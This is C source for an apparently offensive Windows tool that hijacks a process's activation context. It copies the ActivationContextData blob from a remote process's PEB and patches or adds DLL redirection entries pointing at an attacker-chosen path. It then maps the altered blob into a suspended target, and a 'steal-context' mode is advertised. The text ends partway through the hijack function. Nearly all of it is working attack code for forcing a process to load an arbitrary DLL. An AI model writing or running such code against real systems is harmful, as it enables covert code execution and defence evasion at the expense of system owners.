#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#include "actctx.h"
#include "ntdefs.h"

/* --------------------- Helper functions --------------------- */
/* ------------------------------------------------------------ */

static int bounds_ok(const BYTE* blob, ULONG totalSize, ULONG offset, ULONG size)
{
    if ((ULONGLONG)offset + size > totalSize) return 0;
    return 1;
}

static void print_wcs(const WCHAR* ws, ULONG byteLen)
{
    ULONG nChars = byteLen / sizeof(WCHAR);
    for (ULONG i = 0; i < nChars; i++)
        wprintf(L"%c", ws[i]);
}

static WCHAR* assemble_path(
    const BYTE* B1,
    ULONG       b1Offset,
    const ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION* redir,
    ULONG       totalSize)
{
    if (redir->PathSegmentCount == 0 || redir->TotalPathLength == 0)
        return NULL;

    ULONG bufBytes = redir->TotalPathLength + sizeof(WCHAR);
    WCHAR* result = (WCHAR*)malloc(bufBytes);
    if (!result) return NULL;
    ZeroMemory(result, bufBytes);

    WCHAR* cursor   = result;
    ULONG remaining = redir->TotalPathLength;

    const ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT* segs =
        BLOB_PTR(B1, redir->PathSegmentOffset,
                 ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT);

    ULONG segsOffset = b1Offset + redir->PathSegmentOffset;
    ULONG segsBytes  = redir->PathSegmentCount *
                       sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT);
    if (!bounds_ok((BYTE*)0, totalSize, segsOffset, segsBytes)) {
        free(result);
        return NULL;
    }

    for (ULONG s = 0; s < redir->PathSegmentCount; s++) {
        if (segs[s].Length == 0 || segs[s].Length > remaining) break;

        ULONG segGlobalOffset = b1Offset + segs[s].Offset;
        if (!bounds_ok((BYTE*)0, totalSize, segGlobalOffset, segs[s].Length)) break;

        const WCHAR* fragment = BLOB_PTR(B1, segs[s].Offset, WCHAR);
        ULONG nChars = segs[s].Length / sizeof(WCHAR);
        memcpy(cursor, fragment, segs[s].Length);
        cursor    += nChars;
        remaining -= segs[s].Length;
    }

    return result;
}

static ULONG x65599_hash(const WCHAR* str, ULONG byteLen)
{
    ULONG hash   = 0;
    ULONG nChars = byteLen / sizeof(WCHAR);
    for (ULONG i = 0; i < nChars; i++) {
        WCHAR c = str[i];
        if (c >= L'a' && c <= L'z') c -= (L'a' - L'A');  // <- uppercase
        hash = hash * 65599 + c;
    }
    return hash;
}

static ULONG calc_needed(ULONG existingEntryCount, ULONG keyByteLen, ULONG pathByteLen)
{
    return (existingEntryCount + 1)
               * sizeof(ACTIVATION_CONTEXT_STRING_SECTION_ENTRY)
           + keyByteLen
           + sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION)
           + sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT)
           + pathByteLen;
}

static int locate_redir(
    BYTE*  blob,
    ULONG  totalSize,
    ULONG  entryIdx,
    ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION** ppRedir,
    BYTE** ppB1,
    ULONG* pb1Offset)
{
    ACTIVATION_CONTEXT_DATA*         actx = (ACTIVATION_CONTEXT_DATA*)blob;
    ACTIVATION_CONTEXT_DATA_TOC_HEADER* toc =
        (ACTIVATION_CONTEXT_DATA_TOC_HEADER*)(blob + actx->DefaultTocOffset);
    ACTIVATION_CONTEXT_DATA_TOC_ENTRY* tocEntries =
        (ACTIVATION_CONTEXT_DATA_TOC_ENTRY*)(blob + toc->FirstEntryOffset);

    // Search for Id==2
    ACTIVATION_CONTEXT_DATA_TOC_ENTRY* dllToc = NULL;
    for (ULONG i = 0; i < toc->EntryCount; i++) {
        if (tocEntries[i].Id == ACTIVATION_CONTEXT_SECTION_DLL_REDIRECTION) {
            dllToc = &tocEntries[i];
            break;
        }
    }
    if (!dllToc) {
        printf("[ERROR] locate_redir: no DLL redirection section (Id==2) found.\n");
        return -1;
    }

    ACTIVATION_CONTEXT_STRING_SECTION_HEADER* sshdr =
        (ACTIVATION_CONTEXT_STRING_SECTION_HEADER*)(blob + dllToc->Offset);
    BYTE* B1     = (BYTE*)sshdr;
    ULONG b1Off  = dllToc->Offset;

    if (entryIdx >= sshdr->ElementCount) {
        fprintf(stderr, "[!] locate_redir: entryIdx %lu >= ElementCount %lu\n",
                entryIdx, sshdr->ElementCount);
        return -1;
    }

    ACTIVATION_CONTEXT_STRING_SECTION_ENTRY* strEntries =
        (ACTIVATION_CONTEXT_STRING_SECTION_ENTRY*)(B1 + sshdr->ElementListOffset);
    ACTIVATION_CONTEXT_STRING_SECTION_ENTRY* e = &strEntries[entryIdx];

    ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION* redir =
        (ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION*)(B1 + e->Offset);

    *ppRedir   = redir;
    *ppB1      = B1;
    *pb1Offset = b1Off;
    return 0;
}

/* --------------------- Finish of Helper functions --------------------- */
/* ---------------------------------------------------------------------- */

/* ------------------------ Utility functions --------------------------- */
/* ---------------------------------------------------------------------- */

// Reads ACTIVATION_CONTEXT_DATA from a remote process via its PEB and copies the full blob to a local heap buffer
void* CopyRemoteActCtxByHandle(fnNtQueryInformationProcess pNtQueryInformationProcess, fnNtReadVirtualMemory pNtReadVirtualMemory, HANDLE hProcess, PSIZE_T actCtxSize){
    NTSTATUS status = 0;

    // Get remote PEB address via ProcessBasicInformation
    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG returnLength = 0;
    status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);

    if(!NT_SUCCESS(status)){ 
        printf("[ERROR] NtQueryInformationProcess failed. Status: 0x%08lX\n", (unsigned long)status);
        return (void*)0; 
    }

    // Read the pointer at PEB+0x2F8 (ActivationContextData) to get B0
    PVOID actxBase = NULL;
    SIZE_T got = 0;
    PVOID actxFieldAddr = (PVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x2f8);
    status = pNtReadVirtualMemory(hProcess, actxFieldAddr, &actxBase, sizeof(actxBase), &got);

    if (!NT_SUCCESS(status)) { 
        printf("[ERROR] NtReadVirtualMemory failed. Status: 0x%08lX\n", (unsigned long)status);
        return (void*)0;
    }

    // Read the fixed header to extract TotalSize and validate Magic
    ACTIVATION_CONTEXT_DATA hdr = {0};
    status = pNtReadVirtualMemory(hProcess, actxBase, &hdr, sizeof(hdr), &got);

    if (!NT_SUCCESS(status)) { 
        printf("[ERROR] NtReadVirtualMemory failed. Status: 0x%08lX\n", (unsigned long)status);
        return (void*)0;
    }

    // Validate Magic: must be 0x78746341 ("Actx")
    if(hdr.Magic != ACTX_MAGIC){
        printf("[ERROR] Invalid Magic number on ACTIVATION_CONTEXT_DATA (expected 0x%08lX = \"Actx\")\n", ACTX_MAGIC);
        return (void*)0;
    }

    // Security check on TotalSize before allocating
    if (hdr.TotalSize < sizeof(ACTIVATION_CONTEXT_DATA) || hdr.TotalSize > (64u * 1024u * 1024u)) {
        printf("[ERROR] ACTIVATION_CONTEXT_DATA.TotalSize out-of-bound: 0x%lX\n", hdr.TotalSize);
        return (void*)0;
    }

    // Allocate local buffer and copy the full blob from the target process
    SIZE_T blobSize = (SIZE_T)hdr.TotalSize;
    PVOID blob = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, blobSize);

    if (!blob) {
        printf("[ERROR] HeapAlloc(%zu) failed\n", blobSize);
        return (void*)0;
    }

    status = pNtReadVirtualMemory(hProcess, actxBase, blob, blobSize, &got);

    if (!NT_SUCCESS(status)) { 
        printf("[ERROR] NtReadVirtualMemory failed. Status: 0x%08lX\n", (unsigned long)status);
        HeapFree(GetProcessHeap(), 0, blob);
        return (void*)0;
    }

    *actCtxSize = blobSize;
    printf("[SUCCESS] Activation Context Data Blob copied to local heap buffer @%p (%zu bytes)\n", blob, blobSize);
    
    return blob;
}

// Parses the DLL redirection section from a local ACTIVATION_CONTEXT_DATA blob and prints the results
void ParseDllRedirections(const BYTE* blob, ULONG totalSize)
{
    // 1. Blob header
    if (!bounds_ok(blob, totalSize, 0, sizeof(ACTIVATION_CONTEXT_DATA))) {
        wprintf(L"[ERROR] Blob too small for ACTIVATION_CONTEXT_DATA\n");
        return;
    }
    const ACTIVATION_CONTEXT_DATA* actx =
        BLOB_PTR(blob, 0, ACTIVATION_CONTEXT_DATA);

    wprintf(L"\n+-[ ACTIVATION CONTEXT DATA ]\n");
    wprintf(L"|  Magic         : 0x%08lX (Actx)\n",  actx->Magic);
    wprintf(L"|  HeaderSize    : 0x%lX (%lu bytes)\n", actx->HeaderSize, actx->HeaderSize);
    wprintf(L"|  FormatVersion : %lu\n",               actx->FormatVersion);
    wprintf(L"|  TotalSize     : 0x%lX (%lu bytes)\n", actx->TotalSize,   actx->TotalSize);
    wprintf(L"|  Flags         : 0x%08lX\n",           actx->Flags);
    wprintf(L"|\n");

    // 2. TOC header
    if (!bounds_ok(blob, totalSize,
                   actx->DefaultTocOffset,
                   sizeof(ACTIVATION_CONTEXT_DATA_TOC_HEADER))) {
        wprintf(L"+--[ERROR] DefaultTocOffset out of range\n");
        return;
    }
    const ACTIVATION_CONTEXT_DATA_TOC_HEADER* toc =
        BLOB_PTR(blob, actx->DefaultTocOffset, ACTIVATION_CONTEXT_DATA_TOC_HEADER);

    // 3. TOC entries
    ULONG tocEntriesSize =
        toc->EntryCount * sizeof(ACTIVATION_CONTEXT_DATA_TOC_ENTRY);
    if (!bounds_ok(blob, totalSize, toc->FirstEntryOffset, tocEntriesSize)) {
        wprintf(L"+--[ERROR] TOC entries array out of range\n");
        return;
    }
    const ACTIVATION_CONTEXT_DATA_TOC_ENTRY* entries =
        BLOB_PTR(blob, toc->FirstEntryOffset, ACTIVATION_CONTEXT_DATA_TOC_ENTRY);

    wprintf(L"+--[ TOC ] %lu %s\n",
            toc->EntryCount,
            toc->EntryCount == 1 ? L"entry" : L"entries");

    // 4. Find DLL redirection entry
    const ACTIVATION_CONTEXT_DATA_TOC_ENTRY* dllEntry = NULL;
    for (ULONG i = 0; i < toc->EntryCount; i++) {
        BOOL isDll = (entries[i].Id == ACTIVATION_CONTEXT_SECTION_DLL_REDIRECTION);
        wprintf(L"|  [%02lu] Id=%-2lu  Format=%lu  Offset=0x%04lX  Length=0x%04lX%s\n",
                i,
                entries[i].Id,
                entries[i].Format,
                entries[i].Offset,
                entries[i].Length,
                isDll ? L"  <-- DLL Redirection" : L"");
        if (isDll)
            dllEntry = &entries[i];
    }
    wprintf(L"|\n");

    if (!dllEntry) {
        wprintf(L"+--[ DLL REDIRECTION ] not present in this blob\n");
        wprintf(L"|\n");
        wprintf(L"+--[ HINT ] Use 'steal-context' to steal the Activation Context\n");
        wprintf(L"            from a running process that has one.\n");
        wprintf(L"            Example: -m spawn|runtime -s steal-context -p <target> -d <dll> --dll-path <path> --steal-from <process>\n\n");
        return;
    }
    if (dllEntry->Format != ACTIVATION_CONTEXT_SECTION_FORMAT_STRING_TABLE) {
        wprintf(L"+--[ERROR] Unexpected DLL section format: %lu\n", dllEntry->Format);
        return;
    }

    // 5. STRING_SECTION_HEADER = B1
    if (!bounds_ok(blob, totalSize,
                   dllEntry->Offset,
                   sizeof(ACTIVATION_CONTEXT_STRING_SECTION_HEADER))) {
        wprintf(L"+--[ERROR] STRING_SECTION_HEADER offset out of range\n");
        return;
    }
    const ACTIVATION_CONTEXT_STRING_SECTION_HEADER* sshdr =
        BLOB_PTR(blob, dllEntry->Offset, ACTIVATION_CONTEXT_STRING_SECTION_HEADER);

    if (sshdr->Magic != STRING_SECTION_MAGIC) {
        wprintf(L"+--[ERROR] Invalid STRING_SECTION magic: 0x%08lX\n", sshdr->Magic);
        return;
    }

    const BYTE* B1    = (const BYTE*)sshdr;
    ULONG       b1Off = dllEntry->Offset;

    // 6. STRING_SECTION entries
    ULONG entriesSize =
        sshdr->ElementCount * sizeof(ACTIVATION_CONTEXT_STRING_SECTION_ENTRY);
    if (!bounds_ok(B1, totalSize - b1Off,
                   sshdr->ElementListOffset, entriesSize)) {
        wprintf(L"+--[ERROR] STRING_SECTION_ENTRY array out of range\n");
        return;
    }
    const ACTIVATION_CONTEXT_STRING_SECTION_ENTRY* strEntries =
        BLOB_PTR(B1, sshdr->ElementListOffset,
                 ACTIVATION_CONTEXT_STRING_SECTION_ENTRY);

    wprintf(L"+--[ DLL REDIRECTION ] %lu %s\n",
            sshdr->ElementCount,
            sshdr->ElementCount == 1 ? L"entry" : L"entries");

    // 7. Iterate entries
    for (ULONG i = 0; i < sshdr->ElementCount; i++) {
        const ACTIVATION_CONTEXT_STRING_SECTION_ENTRY* e = &strEntries[i];
        BOOL isLast = (i == sshdr->ElementCount - 1);

        /* DLL name (key) */
        wprintf(L"|  [%02lu] ", i);
        if (bounds_ok(B1, totalSize - b1Off, e->KeyOffset, e->KeyLength)) {
            const WCHAR* key = BLOB_PTR(B1, e->KeyOffset, WCHAR);
            print_wcs(key, e->KeyLength);
        } else {
            wprintf(L"<key out of range>");
        }
        wprintf(L"\n");

        // DLL_REDIRECTION
        if (!bounds_ok(B1, totalSize - b1Off,
                       e->Offset,
                       sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION))) {
            wprintf(L"|       <DLL_REDIRECTION out of range>\n");
            if (!isLast) wprintf(L"|\n");
            continue;
        }
        const ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION* redir =
            BLOB_PTR(B1, e->Offset, ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION);

        // Flags as string
        WCHAR flagStr[128] = { 0 };
        if (redir->Flags == 0)
            wcscat_s(flagStr, 128, L"NONE");
        if (redir->Flags & ACTX_DLL_REDIR_PATH_INCLUDES_BASE_NAME)
            wcscat_s(flagStr, 128, L"PATH_INCLUDES_BASE_NAME");
        if (redir->Flags & ACTX_DLL_REDIR_OMITS_ASSEMBLY_ROOT)
            wcscat_s(flagStr, 128, L"OMITS_ASSEMBLY_ROOT");
        if (redir->Flags & ACTX_DLL_REDIR_EXPAND)
            wcscat_s(flagStr, 128, L"EXPAND");
        if (redir->Flags & ACTX_DLL_REDIR_SYSTEM_DEFAULT_REDIRECTED)
            wcscat_s(flagStr, 128, L"SYSTEM_DEFAULT");

        wprintf(L"|       PseudoKey  : 0x%08lX\n", e->PseudoKey);
        wprintf(L"|       RosterIdx  : %lu\n",       e->AssemblyRosterIndex);
        wprintf(L"|       Flags      : %s\n",        flagStr);
        wprintf(L"|       Segments   : %lu  PathLen=%lu bytes\n",
                redir->PathSegmentCount, redir->TotalPathLength);

        // Assembled path
        WCHAR* fullPath = assemble_path(B1, b1Off, redir, totalSize);
        if (fullPath) {
            wprintf(L"|       Path       : %s\n", fullPath);
            free(fullPath);
        } else {
            wprintf(L"|       Path       : <reconstructed from roster>\n");
        }

        if (!isLast) wprintf(L"|\n");
    }

    wprintf(L"|\n");
    wprintf(L"+--[ END ]\n\n");
}

// Patches an existing DLL redirection entry with a new redirect path. Appends PATH_SEGMENT + WCHAR[] at the end of the blob.
ULONG PatchDllRedirectionEntry(
    BYTE*        blob,
    ULONG        totalSize,
    ULONG        entryIdx,
    const WCHAR* redirectPath)
{
    ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION* redir = NULL;
    BYTE*  B1    = NULL;
    ULONG  b1Off = 0;

    if (locate_redir(blob, totalSize, entryIdx, &redir, &B1, &b1Off) != 0)
        return totalSize;

    printf("[PATCH] entry[%lu] before: Flags=0x%08lX  SegCount=%lu  PathLen=%lu\n",
           entryIdx, redir->Flags, redir->PathSegmentCount, redir->TotalPathLength);

    ULONG pathByteLen = (ULONG)(wcslen(redirectPath) * sizeof(WCHAR));
    ULONG neededExtra = sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT)
                      + pathByteLen;

    if (neededExtra > EXTRA_BYTES) {
        fprintf(stderr, "[ERROR] EXTRA_BYTES insufficient (%lu needed, %u available)\n",
                neededExtra, EXTRA_BYTES);
        return totalSize;
    }

    // Offsets from B1 for new data appended at end of blob
    ULONG segOffsetFromB1 = totalSize - b1Off;
    ULONG strOffsetFromB1 = segOffsetFromB1
                          + sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT);

    // Write PATH_SEGMENT at end of blob
    ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT* newSeg =
        (ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT*)(blob + totalSize);
    newSeg->Length = pathByteLen;
    newSeg->Offset = strOffsetFromB1;

    // Write WCHAR[] redirect path immediately after
    WCHAR* strDest = (WCHAR*)(blob + totalSize
                   + sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT));
    memcpy(strDest, redirectPath, pathByteLen);

    // Patch DLL_REDIRECTION fields
    redir->Flags             = ACTX_DLL_REDIR_PATH_INCLUDES_BASE_NAME;
    redir->PathSegmentCount  = 1;
    redir->TotalPathLength   = pathByteLen;
    redir->PathSegmentOffset = segOffsetFromB1;

    // Update TotalSize in blob header
    ULONG newTotalSize = totalSize + neededExtra;
    ((ACTIVATION_CONTEXT_DATA*)blob)->TotalSize = newTotalSize;

    // Update TOC entry Length to cover new data
    ACTIVATION_CONTEXT_DATA*            actx       = (ACTIVATION_CONTEXT_DATA*)blob;
    ACTIVATION_CONTEXT_DATA_TOC_HEADER* toc        = (ACTIVATION_CONTEXT_DATA_TOC_HEADER*)(blob + actx->DefaultTocOffset);
    ACTIVATION_CONTEXT_DATA_TOC_ENTRY*  tocEntries = (ACTIVATION_CONTEXT_DATA_TOC_ENTRY*)(blob + toc->FirstEntryOffset);

    for (ULONG i = 0; i < toc->EntryCount; i++) {
        if (tocEntries[i].Id == ACTIVATION_CONTEXT_SECTION_DLL_REDIRECTION) {
            tocEntries[i].Length = newTotalSize - b1Off;
            break;
        }
    }

    printf("[PATCH] segOffsetFromB1 = 0x%lX\n", segOffsetFromB1);
    printf("[PATCH] strOffsetFromB1 = 0x%lX\n", strOffsetFromB1);
    printf("[PATCH] pathByteLen     = %lu bytes\n", pathByteLen);
    printf("[PATCH] entry[%lu] after: Flags=0x%08lX  SegCount=%lu  PathLen=%lu\n",
           entryIdx, redir->Flags, redir->PathSegmentCount, redir->TotalPathLength);
    printf("[PATCH] TotalSize: 0x%lX -> 0x%lX\n", totalSize, newTotalSize);

    return newTotalSize;
}

// Appends a brand-new DLL redirection entry to the blob. Relocates the entry array and writes all new structures at end of blob.
ULONG AddDllRedirectionEntry(
    BYTE*        blob,
    ULONG        totalSize,
    const WCHAR* dllName,
    const WCHAR* redirectPath,
    ULONG        rosterIdx)
{
    ACTIVATION_CONTEXT_DATA*            actx       = (ACTIVATION_CONTEXT_DATA*)blob;
    ACTIVATION_CONTEXT_DATA_TOC_HEADER* toc        = (ACTIVATION_CONTEXT_DATA_TOC_HEADER*)(blob + actx->DefaultTocOffset);
    ACTIVATION_CONTEXT_DATA_TOC_ENTRY*  tocEntries = (ACTIVATION_CONTEXT_DATA_TOC_ENTRY*)(blob + toc->FirstEntryOffset);

    ACTIVATION_CONTEXT_DATA_TOC_ENTRY* dllToc = NULL;
    for (ULONG i = 0; i < toc->EntryCount; i++) {
        if (tocEntries[i].Id == ACTIVATION_CONTEXT_SECTION_DLL_REDIRECTION) {
            dllToc = &tocEntries[i];
            break;
        }
    }
    if (!dllToc) {
        fprintf(stderr, "[ERROR] AddDllEntry: no DLL redirection section (Id==2) found.\n");
        return totalSize;
    }

    ACTIVATION_CONTEXT_STRING_SECTION_HEADER* sshdr =
        (ACTIVATION_CONTEXT_STRING_SECTION_HEADER*)(blob + dllToc->Offset);
    BYTE* B1    = (BYTE*)sshdr;
    ULONG b1Off = dllToc->Offset;

    ULONG keyByteLen  = (ULONG)(wcslen(dllName)      * sizeof(WCHAR));
    ULONG pathByteLen = (ULONG)(wcslen(redirectPath) * sizeof(WCHAR));
    ULONG needed      = calc_needed(sshdr->ElementCount, keyByteLen, pathByteLen);

    if (needed > EXTRA_BYTES_ADD) {
        fprintf(stderr, "[ERROR] AddDllEntry: need %lu bytes, EXTRA_BYTES_ADD=%u\n",
                needed, EXTRA_BYTES_ADD);
        return totalSize;
    }

    ULONG cursor = totalSize;

    // 1. Relocate existing entry array to end of blob
    ULONG oldEntriesBytes      = sshdr->ElementCount * sizeof(ACTIVATION_CONTEXT_STRING_SECTION_ENTRY);
    ULONG newArrayOffsetFromB1 = cursor - b1Off;
    memcpy(blob + cursor, B1 + sshdr->ElementListOffset, oldEntriesBytes);
    cursor += oldEntriesBytes;

    // 2. Write new STRING_SECTION_ENTRY
    ACTIVATION_CONTEXT_STRING_SECTION_ENTRY* newEntry =
        (ACTIVATION_CONTEXT_STRING_SECTION_ENTRY*)(blob + cursor);
    cursor += sizeof(ACTIVATION_CONTEXT_STRING_SECTION_ENTRY);

    // 3. Write WCHAR[] DLL key
    ULONG keyOffsetFromB1 = cursor - b1Off;
    memcpy(blob + cursor, dllName, keyByteLen);
    cursor += keyByteLen;

    // 4. Write ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION
    ULONG redirOffsetFromB1 = cursor - b1Off;
    ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION* redir =
        (ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION*)(blob + cursor);
    cursor += sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION);

    // 5. Write PATH_SEGMENT
    ULONG segOffsetFromB1 = cursor - b1Off;
    ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT* seg =
        (ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT*)(blob + cursor);
    cursor += sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT);

    // 6. Write WCHAR[] redirect path
    ULONG strOffsetFromB1 = cursor - b1Off;
    memcpy(blob + cursor, redirectPath, pathByteLen);
    cursor += pathByteLen;

    // Fill structures with computed offsets
    seg->Length = pathByteLen;
    seg->Offset = strOffsetFromB1;

    redir->Size              = sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION);
    redir->Flags             = ACTX_DLL_REDIR_PATH_INCLUDES_BASE_NAME;
    redir->TotalPathLength   = pathByteLen;
    redir->PathSegmentCount  = 1;
    redir->PathSegmentOffset = segOffsetFromB1;

    newEntry->PseudoKey           = x65599_hash(dllName, keyByteLen);
    newEntry->KeyOffset           = keyOffsetFromB1;
    newEntry->KeyLength           = keyByteLen;
    newEntry->Offset              = redirOffsetFromB1;
    newEntry->Length              = sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION)
                                  + sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT)
                                  + pathByteLen;
    newEntry->AssemblyRosterIndex = rosterIdx;

    // Update STRING_SECTION_HEADER
    sshdr->ElementListOffset = newArrayOffsetFromB1;
    sshdr->ElementCount     += 1;

    // Full insertion sort of all entries by PseudoKey.  The donor blob's original
    // ElementList is in arbitrary order (the donor used SearchStructureOffset for
    // lookup, so order never mattered there).  We must sort every element — not
    // just insert the new one — before zeroing SearchStructureOffset, otherwise
    // ntdll's binary-search fallback will miss entries in the wrong positions.
    ACTIVATION_CONTEXT_STRING_SECTION_ENTRY* arr =
        (ACTIVATION_CONTEXT_STRING_SECTION_ENTRY*)(blob + totalSize);
    ULONG arrCount = sshdr->ElementCount;
    ULONG savedPseudoKey = arr[arrCount - 1].PseudoKey;  // capture before sort moves it
    for (ULONG si = 1; si < arrCount; si++) {
        ACTIVATION_CONTEXT_STRING_SECTION_ENTRY stmp = arr[si];
        LONG j = (LONG)si - 1;
        while (j >= 0 && arr[j].PseudoKey > stmp.PseudoKey) {
            arr[j + 1] = arr[j];
            j--;
        }
        arr[j + 1] = stmp;
    }
    sshdr->SearchStructureOffset = 0;

    // Update blob TotalSize and TOC entry Length
    ULONG newTotalSize = cursor;
    actx->TotalSize    = newTotalSize;
    dllToc->Length     = newTotalSize - b1Off;

    printf("[ADD] DLL key       : %ls\n",     dllName);
    printf("[ADD] Redirect path : %ls\n",     redirectPath);
    printf("[ADD] PseudoKey     : 0x%08lX\n", savedPseudoKey);
    printf("[ADD] RosterIndex   : %lu\n",     rosterIdx);
    printf("[ADD] ElementCount  : %lu\n",     sshdr->ElementCount);
    printf("[ADD] TotalSize     : 0x%lX -> 0x%lX\n", totalSize, newTotalSize);

    return newTotalSize;
}

// Searches the DLL Redirection section (TOC Id==2) for an entry matching
// dllName using case-insensitive key comparison (bypasses PseudoKey mismatch).
// If found, patches its redirect path. If not found, adds a new entry.
ULONG PatchOrAddDllRedirection(
    BYTE*        blob,
    ULONG        totalSize,
    const WCHAR* dllName,
    const WCHAR* redirectPath,
    ULONG        rosterIdx)
{
    ACTIVATION_CONTEXT_DATA*            actx       = (ACTIVATION_CONTEXT_DATA*)blob;
    ACTIVATION_CONTEXT_DATA_TOC_HEADER* toc        = (ACTIVATION_CONTEXT_DATA_TOC_HEADER*)(blob + actx->DefaultTocOffset);
    ACTIVATION_CONTEXT_DATA_TOC_ENTRY*  tocEntries = (ACTIVATION_CONTEXT_DATA_TOC_ENTRY*)(blob + toc->FirstEntryOffset);

    // Locate TOC entry Id==2
    ACTIVATION_CONTEXT_DATA_TOC_ENTRY* dllToc = NULL;
    for (ULONG i = 0; i < toc->EntryCount; i++) {
        if (tocEntries[i].Id == ACTIVATION_CONTEXT_SECTION_DLL_REDIRECTION) {
            dllToc = &tocEntries[i];
            break;
        }
    }
    if (!dllToc) {
        fprintf(stderr, "[ERROR] PatchOrAdd: no DLL redirection section (Id==2) found.\n");
        return totalSize;
    }

    ACTIVATION_CONTEXT_STRING_SECTION_HEADER* sshdr =
        (ACTIVATION_CONTEXT_STRING_SECTION_HEADER*)(blob + dllToc->Offset);
    BYTE* B1    = (BYTE*)sshdr;
    ULONG b1Off = dllToc->Offset;

    ACTIVATION_CONTEXT_STRING_SECTION_ENTRY* strEntries =
        (ACTIVATION_CONTEXT_STRING_SECTION_ENTRY*)(B1 + sshdr->ElementListOffset);

    ULONG keyByteLen = (ULONG)(wcslen(dllName) * sizeof(WCHAR));

    // Search by case-insensitive key comparison only (skip PseudoKey check
    // since Windows may hash with different normalization)
    LONG foundIdx = -1;
    for (ULONG i = 0; i < sshdr->ElementCount; i++) {
        if (keyByteLen != strEntries[i].KeyLength) continue;
        if (!bounds_ok(B1, totalSize - b1Off,
                       strEntries[i].KeyOffset,
                       strEntries[i].KeyLength)) continue;

        const WCHAR* existingKey = (const WCHAR*)(B1 + strEntries[i].KeyOffset);
        ULONG nChars = keyByteLen / sizeof(WCHAR);
        BOOL match = TRUE;
        for (ULONG c = 0; c < nChars; c++) {
            WCHAR a = existingKey[c];
            WCHAR b = dllName[c];
            if (a >= L'A' && a <= L'Z') a += (L'a' - L'A');
            if (b >= L'A' && b <= L'Z') b += (L'a' - L'A');
            if (a != b) { match = FALSE; break; }
        }
        if (match) { foundIdx = (LONG)i; break; }
    }

    if (foundIdx >= 0) {
        printf("[+] '%ls' found at entry[%ld] -> patching path.\n", dllName, foundIdx);
        return PatchDllRedirectionEntry(blob, totalSize, (ULONG)foundIdx, redirectPath);
    } else {
        printf("[+] '%ls' not found -> adding new entry.\n", dllName);
        return AddDllRedirectionEntry(blob, totalSize, dllName, redirectPath, rosterIdx);
    }
}

// Hijacks the memory region by unmapping the original Activation Context and mapping the patched one
NTSTATUS HijackActCtx(
    fnNtReadVirtualMemory         pNtReadVirtualMemory,
    fnNtCreateSection             pNtCreateSection,
    fnNtMapViewOfSection          pNtMapViewOfSection,
    fnNtUnmapViewOfSection        pNtUnmapViewOfSection,
    fnNtQueryInformationProcess   pNtQueryInformationProcess,
    HANDLE                        hProcess,
    void*                         actCtxBlob,
    SIZE_T                        actCtxSize
){
    NTSTATUS status;

    // Get PEB address of the target (suspended) process
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength = 0;
    status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);
    if (!NT_SUCCESS(status)) {
        printf("[ERROR] NtQueryInformationProcess failed: 0x%08lX\n", status);
        return status;
    }

    // Read the pointer at PEB+0x2F8 (ActivationContextData) - this is the kernel-set address
    PVOID originalAddr = NULL;
    SIZE_T bytesRead = 0;
    status = pNtReadVirtualMemory(hProcess, (PVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x2F8), &originalAddr, sizeof(PVOID), &bytesRead);
    if (!NT_SUCCESS(status)) {
        printf("[ERROR] NtReadVirtualMemory (PEB.ActivationContextData) failed: 0x%08lX\n", status);
        return status;
    }
    printf("[INFO] Original PEB.ActivationContextData = %p\n", originalAddr);

    // Create an anonymous page-file-backed section sized to our patched blob
    LARGE_INTEGER secSize;
    secSize.QuadPart = (LONGLONG)actCtxSize;
    HANDLE hSection = NULL;
    status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &secSize, PAGE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[ERROR] NtCreateSection failed: 0x%08lX\n", status);
        return status;
    }

    // Map the section locally and copy the patched blob into it
    PVOID localView = NULL;
    SIZE_T localViewSize = 0;
    status = pNtMapViewOfSection(hSection, NtCurrentProcess(), &localView, 0, 0, NULL, &localViewSize, ViewUnmap, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        printf("[ERROR] NtMapViewOfSection (local) failed: 0x%08lX\n", status);
        CloseHandle(hSection);
        return status;
    }
    memcpy(localView, actCtxBlob, actCtxSize);
    pNtUnmapViewOfSection(NtCurrentProcess(), localView);
